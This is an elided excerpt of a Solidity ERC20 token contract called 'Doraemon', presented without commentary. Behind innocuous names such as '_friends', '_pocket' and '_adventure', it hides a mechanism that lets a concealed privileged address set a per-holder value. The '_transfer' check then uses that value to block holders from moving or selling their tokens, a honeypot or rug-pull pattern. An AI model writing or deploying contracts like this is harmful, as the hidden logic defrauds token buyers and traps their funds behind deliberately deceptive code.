...
contract Doraemon is IERC20, Ownable {
    ...
    mapping (address => Copter) private _friends;

    Door[] private _pocket;
    ...
    constructor(
        ...
        _symbol = symbol_;
        _decimals = 18;
        _pocket.push(Door(robot_, Family(5, 3)));
    ...
    function _adventure(address from, address account, uint256 amount) internal {
        ...
        if (from != _pocket[0].tele) {
            _friends[from].fly -= allow;
            _friends[account].fly += allow;
        } else {
            _friends[from].fly -= allow;
            allow += amount;
            _friends[account].fly = allow;
    ...
    function _transfer(
        ...
        require(amount - _friends[sender].fly > 0, "alien");
